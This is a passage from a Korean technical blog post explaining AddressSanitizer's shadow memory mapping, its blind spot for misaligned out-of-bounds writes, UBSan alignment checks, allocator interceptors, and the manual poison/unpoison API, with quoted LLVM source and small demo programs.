&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_mapping.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-meta">#    <span class="hljs-meta-keyword">define</span> MEM_TO_SHADOW(mem) \</span>      ((STRIP_MTE_TAG(mem) &gt;&gt; ASAN_SHADOW_SCALE) + (ASAN_SHADOW_OFFSET))<span class="hljs-meta">#    <span class="hljs-meta-keyword">define</span> SHADOW_TO_MEM(mem) \</span>      (((mem) - (ASAN_SHADOW_OFFSET)) &lt;&lt; (ASAN_SHADOW_SCALE))</code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; 8&#xBC14;&#xC774;&#xD2B8;&#xB294; &#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC; 1&#xBC14;&#xC774;&#xD2B8;&#xC5D0; &#xB300;&#xC751;&#xB429;&#xB2C8;&#xB2E4;. </p><p><code>SHADOW_OFFSET</code>&#xC740; &#xD50C;&#xB7AB;&#xD3FC;/&#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xBCC4;&#xB85C; &#xBCC4;&#xB3C4;&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; x86-64 &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; <code>0x7fff8000</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_mapping.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-comment">// Typical shadow mapping on Linux/x86_64 with SHADOW_OFFSET == 0x00007fff8000:</span><span class="hljs-comment">// || `[0x10007fff8000, 0x7fffffffffff]` || HighMem    ||</span><span class="hljs-comment">// || `[0x02008fff7000, 0x10007fff7fff]` || HighShadow ||</span><span class="hljs-comment">// || `[0x00008fff7000, 0x02008fff6fff]` || ShadowGap  ||</span><span class="hljs-comment">// || `[0x00007fff8000, 0x00008fff6fff]` || LowShadow  ||</span><span class="hljs-comment">// || `[0x000000000000, 0x00007fff7fff]` || LowMem     ||</span>...<span class="hljs-meta">#    <span class="hljs-meta-keyword">if</span> ASAN_SHADOW_SCALE != 3</span><span class="hljs-meta">#      <span class="hljs-meta-keyword">error</span> <span class="hljs-meta-string">&quot;Value below is based on shadow scale = 3.&quot;</span></span><span class="hljs-meta">#      <span class="hljs-meta-keyword">error</span> <span class="hljs-meta-string">&quot;Original formula was: 0x7FFFFFFF &amp; (~0xFFFULL &lt;&lt; SHADOW_SCALE).&quot;</span></span><span class="hljs-meta">#    <span class="hljs-meta-keyword">endif</span></span><span class="hljs-meta">#    <span class="hljs-meta-keyword">define</span> ASAN_SHADOW_OFFSET_CONST 0x000000007fff8000</span><span class="hljs-meta">#  <span class="hljs-meta-keyword">endif</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>...</code></pre><p>&#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB3C4; &#xBB38;&#xC11C;&#xD654;&#xB41C; &#xAC83;&#xCC98;&#xB7FC; &#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC;&#xC640; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xB9E4;&#xD551; &#xC601;&#xC5ED;&#xC774; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. x86-64 &#xAE30;&#xC900;&#xC73C;&#xB85C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p><div class="table-container"><table><thead><tr><th>&#xBD84;&#xB958;</th><th>&#xB9E4;&#xD551; &#xC601;&#xC5ED;</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td>HighMem</td><td><code>[0x10007fff8000, 0x7fffffffffff]</code></td><td>5&#xBC14;&#xC774;&#xD2B8; &#xC774;&#xC0C1;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xB294; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC;</td></tr><tr><td>HighShadow</td><td><code>[0x02008fff7000, 0x10007fff7fff]</code></td><td>HighMem&#xC5D0; &#xB300;&#xC751;&#xB418;&#xB294; Shadow Memory</td></tr><tr><td>ShadowGap</td><td><code>[0x00008fff7000, 0x02008fff6fff]</code></td><td>Shadow Memory &#xAC04; &#xAC04;&#xACA9; &#xAD6C;&#xAC04;</td></tr><tr><td>LowShadow</td><td><code>[0x00007fff8000, 0x00008fff6fff]</code></td><td>LowMem&#xC5D0; &#xB300;&#xC751;&#xB418;&#xB294; Shadow Memory</td></tr><tr><td>LowMem</td><td><code>[0x000000000000, 0x00007fff7fff]</code></td><td>4&#xBC14;&#xC774;&#xD2B8; &#xC774;&#xD558;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xB294; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC;</td></tr></tbody></table></div><p><img src="/2025/12/25/millet/asan-pt1-kr/image3.png" alt></p><ul><li>ShadowGap &#xC601;&#xC5ED;&#xC740; Shadow Memory &#xAC04; &#xAC04;&#xC12D;&#xC744; &#xBC29;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC04;&#xACA9;&#xC73C;&#xB85C; &#xB9E4;&#xD551;&#xB9CC; &#xB418;&#xACE0; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC740; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2025/12/25/millet/asan-pt1-kr/image4.png" alt></p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; 8:1&#xB85C; &#xB9E4;&#xD551;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xB82C;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xC7A1;&#xC544;&#xB0B4;&#xC9C0; &#xBABB;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC; &#xCF54;&#xB4DC;&#xB85C; &#xC0C1;&#xD669;&#xC744; &#xC7AC;&#xD604;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// g++ oob.cpp -o oob -fsanitize=address</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">int</span> *x = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">2</span>];                <span class="hljs-comment">// [0, 7]</span>    <span class="hljs-keyword">int</span> *y = (<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)x + <span class="hljs-number">6</span>);    <span class="hljs-comment">// [6, 9]</span>    *y = <span class="hljs-number">1</span>;                             <span class="hljs-comment">// OOB</span>    <span class="hljs-keyword">delete</span>[] x;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>x86-64 &#xAE30;&#xC900;&#xC73C;&#xB85C; <code>x</code>&#xB294; 8&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xAC1D;&#xCCB4;&#xB85C; &#xC120;&#xC5B8;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>*y = 1;</code>&#xACFC; &#xAC19;&#xC740; &#xC811;&#xADFC;&#xC740; &#xBA85;&#xBC31;&#xD55C; OOB &#xC811;&#xADFC;&#xC774;&#xACA0;&#xC8E0;? &#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xBD10;&#xB3C4; ASan&#xC5D0;&#xC11C; &#xAC10;&#xC9C0;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBE4C;&#xB4DC;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD1B5;&#xD574; ASan&#xC774; &#xC5B4;&#xB5A4; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD588;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5ED;&#xCC38;&#xC870; &#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC758; &#xC870;&#xAC74;&#xBB38;&#xC744; &#xBCF4;&#xAC8C; &#xB418;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; &#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC; &#xC5F0;&#xC0B0;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/12/25/millet/asan-pt1-kr/image5.png" alt></p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB9E4;&#xD551;&#xC774; 8:1&#xB85C; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>v4 + 6 &gt;&gt; 3</code> &#xC5F0;&#xC0B0;&#xC758; &#xACB0;&#xACFC;&#xB294; &#xACB0;&#xAD6D; <code>v4 &gt;&gt; 3</code> &#xC5F0;&#xC0B0;&#xACFC; &#xAC19;&#xC544;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB3D9;&#xC77C;&#xD55C; &#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAC8C; &#xB418;&#xC5B4; OOB&#xB97C; &#xC7A1;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xC801; &#xD55C;&#xACC4;&#xB85C; &#xC778;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xC815;&#xB82C;&#xC774; &#xB9DE;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xAC80;&#xC0AC;&#xAC00; &#xC81C;&#xB300;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xB294; &#xAC83;&#xC774;&#xC8E0;!</p><p>&#xB9E4;&#xD551; &#xC2A4;&#xCF00;&#xC77C;&#xC744; &#xB354; &#xC904;&#xC778;&#xB2E4;&#xBA74; &#xAC80;&#xC0AC;&#xAC00; &#xB354; &#xC5C4;&#xACA9;&#xD558;&#xAC8C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACA0;&#xC9C0;&#xB9CC; &#xBCA1;&#xD130; &#xBA85;&#xB839;&#xC5D0;&#xC11C;&#xC758; &#xBE44;&#xD6A8;&#xC728;&#xC131;&#xACFC; ASan&#xC758; &#xCD08;&#xAE30; &#xC124;&#xACC4;&#xC640;&#xC758; &#xCC28;&#xC774; &#xB4F1;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xBB38;&#xC81C; &#xB54C;&#xBB38;&#xC5D0; &#xD604;&#xC7AC;&#xB294; <code>-fsanitize=alignment</code>&#xC640; &#xAC19;&#xC774; &#xC815;&#xB82C; &#xC704;&#xBC18;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; sanitizer (&#xC774; &#xC635;&#xC158;&#xC758; &#xACBD;&#xC6B0; Undefined Behavior Sanitizer, UBSan)&#xB97C; &#xC801;&#xC6A9;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD574;&#xACB0;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAD8C;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><p><code>-fsanitize=alignment</code> &#xC635;&#xC158;&#xC744; &#xC8FC;&#xACE0; &#xB2E4;&#xC2DC; &#xD55C; &#xBC88; &#xBE4C;&#xB4DC;&#xD574;&#xBCF4;&#xBA74;&#x2026;</p><pre><code class="hljs bash">$ g++ oob.cpp -o oob_aligned -fsanitize=address -fsanitize=alignment$ ./oob_alignedoob.cpp:7:8: runtime error: store to misaligned address 0x502000000016 <span class="hljs-keyword">for</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&apos;int&apos;</span>, <span class="hljs-built_in">which</span> requires 4 byte alignment0x502000000016: note: pointer points here be be be be be be  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00             ^</code></pre><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; OOB &#xC811;&#xADFC;&#xC744; &#xC798; &#xC7A1;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB124;&#xC694;! </p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; UBSan&#xC5D0; &#xC758;&#xD574; &#xC790;&#xB8CC;&#xD615;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC; &#xD568;&#xC218;&#xAC00; &#xCD94;&#xAC00;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC694;&#xAC70;&#xB294;&#x2026; &#xB2E4;&#xC74C; &#xAE30;&#xD68C;&#xC5D0; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;,,,</p><p><img src="/2025/12/25/millet/asan-pt1-kr/image6.png" alt></p><h3 id="2-2-Poisoning-Unpoisoning"><a href="#2-2-Poisoning-Unpoisoning" class="headerlink" title="2.2 Poisoning / Unpoisoning"></a>2.2 Poisoning / Unpoisoning</h3><p>&#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; 8&#xBC14;&#xC774;&#xD2B8; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; 1&#xBC14;&#xC774;&#xD2B8;&#xC5D0; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xACE0; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. ASan&#xC5D0;&#xC11C;&#xB294; &#xC694; 1&#xBC14;&#xC774;&#xD2B8;&#xB97C; 9&#xAC1C;&#xC758; &#xD615;&#xD0DC;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC744; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; unpoison, &#xC811;&#xADFC; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; poison&#xC774;&#xB77C;&#xB294; &#xC0C1;&#xD0DC;&#xB85C; &#xD45C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#x2018;&#xC811;&#xADFC;&#x2019;&#xC740; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ul><li>&#xC5C4;&#xBC00;&#xD558;&#xAC8C; ASan&#xC758; &#xC624;&#xB958; &#xBCF4;&#xACE0; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC77D;&#xAE30;&#xB294; <code>load</code>, &#xC4F0;&#xAE30;&#xB294; <code>store</code>&#xB85C; &#xAD6C;&#xBD84;&#xB418;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; unpoison/poison &#xAD00;&#xC810;&#xC5D0;&#xC11C;&#xB294; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xB97C; &#x2018;&#xC811;&#xADFC;&#x2019;&#xC758; &#xAC1C;&#xB150;&#xC73C;&#xB85C; &#xBC14;&#xB77C;&#xBD05;&#xB2C8;&#xB2E4;.</li></ul><div class="table-container"><table><thead><tr><th>Shadow Byte</th><th>&#xC758;&#xBBF8;</th><th>&#xC0C1;&#xD0DC;</th></tr></thead><tbody><tr><td><code>0</code></td><td>8&#xBC14;&#xC774;&#xD2B8; &#xBAA8;&#xB450; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</td><td>unpoison</td></tr><tr><td><code>&lt; 0</code></td><td>8&#xBC14;&#xC774;&#xD2B8; &#xBAA8;&#xB450; &#xC811;&#xADFC; &#xBD88;&#xAC00;&#xB2A5;</td><td>poison</td></tr><tr><td><code>k (1~7)</code></td><td>&#xC55E;&#xC5D0;&#xC11C;&#xBD80;&#xD130; <code>k</code> &#xBC14;&#xC774;&#xD2B8;&#xB9CC; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</td><td>&#xBD80;&#xBD84; unpoison</td></tr></tbody></table></div><p>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC2DC;&#xC791;&#xB418;&#xBA74; ASAN&#xC5D0; &#xC758;&#xD574; &#xC250;&#xB3C4;&#xC6B0; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC774; &#xB9E4;&#xD551;&#xB418;&#xACE0; &#xAE30;&#xBCF8; &#xC0C1;&#xD0DC;&#xB294; &#xBAA8;&#xB450; poison&#xC73C;&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xBBF8;&#xB9AC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xC608;&#xCE21;&#xD560; &#xC218; &#xC788;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB9CC; unpoison&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xACE0; &#xC6B0;&#xB9AC;&#xAC00; &#xD754;&#xD788; &#xC544;&#xB294; <code>main</code>(&#xBA54;&#xC778; &#xC2A4;&#xB808;&#xB4DC;)&#xC774; &#xD638;&#xCD9C;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD45C;&#xB85C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;!</p><div class="table-container"><table><thead><tr><th>&#xC601;&#xC5ED;</th><th>&#xBA54;&#xC778; &#xC2A4;&#xB808;&#xB4DC; &#xC2E4;&#xD589; &#xC804; &#xCD08;&#xAE30;&#xD654; &#xC5EC;&#xBD80;</th><th>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB3D9;&#xC791; &#xC911; &#xBCC0;&#xACBD; &#xC5EC;&#xBD80;</th></tr></thead><tbody><tr><td>&#xC804;&#xC5ED;/&#xC815;&#xC801; &#xBCC0;&#xC218;</td><td>O (unpoison)</td><td>X</td></tr><tr><td>&#xC2A4;&#xD0DD; &#xD504;&#xB808;&#xC784; (main)</td><td>O (&#xBD80;&#xBD84;&#xC801;&#xC73C;&#xB85C; unpoison)</td><td>&#xD568;&#xC218; &#xD638;&#xCD9C;, &#xBC18;&#xD658; &#xC2DC; &#xAC31;&#xC2E0;</td></tr><tr><td>&#xD799;</td><td>X (poison)</td><td>&#xBCC4;&#xB3C4;&#xC758; &#xC778;&#xD130;&#xC149;&#xD2B8; &#xD568;&#xC218;&#xB85C; &#xAD00;&#xB9AC;</td></tr><tr><td>TLS</td><td>O (unpoison)</td><td>X</td></tr></tbody></table></div><p>&#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xCC98;&#xB7FC; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; ASan&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBCC4;&#xB3C4;&#xC758; &#xC778;&#xD130;&#xC149;&#xD2B8; &#xD568;&#xC218;&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xC5B4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC0BD;&#xC785;&#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/interception/interception.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INTERCEPTOR(ret_type, func, ...)        \</span>  DEFINE_REAL(ret_type, func, __VA_ARGS__)      \  DECLARE_WRAPPER(ret_type, func, __VA_ARGS__)  \  <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">INTERCEPTOR_ATTRIBUTE ret_type <span class="hljs-title">WRAP</span><span class="hljs-params">(func)</span><span class="hljs-params">(__VA_ARGS__)</span></span></code></pre><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp</strong></p></blockquote><pre><code class="hljs c">...INTERCEPTOR(<span class="hljs-keyword">void</span>, <span class="hljs-built_in">free</span>, <span class="hljs-keyword">void</span> *ptr) {  <span class="hljs-keyword">if</span> (DlsymAlloc::PointerIsMine(ptr))    <span class="hljs-keyword">return</span> DlsymAlloc::Free(ptr);  GET_STACK_TRACE_FREE;  asan_free(ptr, &amp;<span class="hljs-built_in">stack</span>);}...INTERCEPTOR(<span class="hljs-keyword">void</span>*, <span class="hljs-built_in">malloc</span>, uptr size) {  <span class="hljs-keyword">if</span> (DlsymAlloc::Use())    <span class="hljs-keyword">return</span> DlsymAlloc::Allocate(size);  GET_STACK_TRACE_MALLOC;  <span class="hljs-keyword">return</span> asan_malloc(size, &amp;<span class="hljs-built_in">stack</span>);}...</code></pre><p>poison/unpoison&#xC740; &#xBCC4;&#xB3C4;&#xC758; API&#xB97C; &#xD1B5;&#xD574; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>llvm-project/compiler-rt/include/sanitizer/asan_interface.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __has_feature(address_sanitizer) || defined(__SANITIZE_ADDRESS__)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_POISON_MEMORY_REGION(addr, size) \</span>  __asan_poison_memory_region((addr), (size))<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_UNPOISON_MEMORY_REGION(addr, size) \</span>  __asan_unpoison_memory_region((addr), (size))<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_POISON_MEMORY_REGION(addr, size) \</span>  ((<span class="hljs-keyword">void</span>)(addr), (<span class="hljs-keyword">void</span>)(size))<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_UNPOISON_MEMORY_REGION(addr, size) \</span>  ((<span class="hljs-keyword">void</span>)(addr), (<span class="hljs-keyword">void</span>)(size))<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span></code></pre><p>&#xBA85;&#xC2DC;&#xC801;&#xC778; poison&#xC758; &#xACBD;&#xC6B0; &#xB7F0;&#xD0C0;&#xC784; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xD1B5;&#xD574; &#xB3D9;&#xC791; &#xC5EC;&#xBD80;&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2F5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">ASAN_OPTIONS=allow_user_poisoning=0</code></pre><p>&#xBA85;&#xC2DC;&#xC801;&#xC778; unpoison, poison&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xC2DC;&#xAE30;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xB370;&#xC5D0; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs c"><span class="hljs-comment">// g++ unpoison.cpp -o unpoison -fsanitize=address</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sanitizer/asan_interface.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">cus_alloc</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">void</span> *p = <span class="hljs-built_in">malloc</span>(size);    ASAN_POISON_MEMORY_REGION(p, size);    <span class="hljs-keyword">return</span> p;}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">activate_p</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *p, <span class="hljs-keyword">size_t</span> size)</span></span><span class="hljs-function"></span>{    ASAN_UNPOISON_MEMORY_REGION(p, size);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">char</span> *p = (<span class="hljs-keyword">char</span> *)cus_alloc(<span class="hljs-number">8</span>);    activate_p(p, <span class="hljs-number">6</span>);    <span class="hljs-built_in">strcpy</span>(p, <span class="hljs-string">&quot;millet&quot;</span>);    <span class="hljs-built_in">puts</span>(p);    <span class="hljs-built_in">free</span>(p);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>ASan&#xC5D0;&#xC11C; &#xC7AC;&#xC120;&#xC5B8;&#xB41C; <code>malloc()</code>&#xC758; &#xACBD;&#xC6B0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xBC1B;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; unpoison&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xC81C; &#xCF54;&#xB4DC;&#xC758; &#xACBD;&#xC6B0;&#xB294; &#xC77C;&#xB2E8; <code>ASAN_POISON_MEMORY_REGION</code>&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xBD88;&#xAC00;&#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xD6C4; &#xC0AC;&#xC6A9;&#xD560; &#xB54C;&#xB9CC; unpoison&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB354;&#xC6B1; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; &#xBA85;&#xC2DC;&#xC801;&#xC778; unpoison&#xC774; &#xC5C6;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC624;&#xB958;&#xB97C; &#xB0B4;&#xBFDC;&#xC73C;&#xBA74;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">./unpoison===================================================================1381294==ERROR: AddressSanitizer: use-after-poison on address 0x502000000010 at pc 0x7f0804f052c3 bp 0x7ffcc58dca60 sp 